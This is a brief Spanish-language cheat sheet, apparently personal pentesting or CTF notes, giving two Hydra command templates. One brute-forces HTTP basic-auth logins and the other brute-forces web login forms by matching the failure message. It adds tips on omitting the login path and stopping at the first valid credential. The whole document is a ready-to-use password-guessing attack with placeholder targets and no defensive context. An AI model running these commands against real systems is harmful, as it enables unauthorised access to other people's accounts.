# Para una web con basic auth

```
hydra -L [USUARIOS] -P [CONTRASEÑAS] [IP] http-get /[RUTA_AL_LOGIN] -s [PUERTO]
```

El parámetro `/[RUTA_AL_LOGIN]` podemos emitirlo si esta en la misma raíz

# Para un login normal

```
hydra -L [USERNAMES] -P [PASSWORDS] [IP] http-post-form "/:username=^USER^&password=^PASS^:F=[MENSAJE_DE_ERROR]" -s [PUERTO]
```


-f si quieres que pare al primer encuentro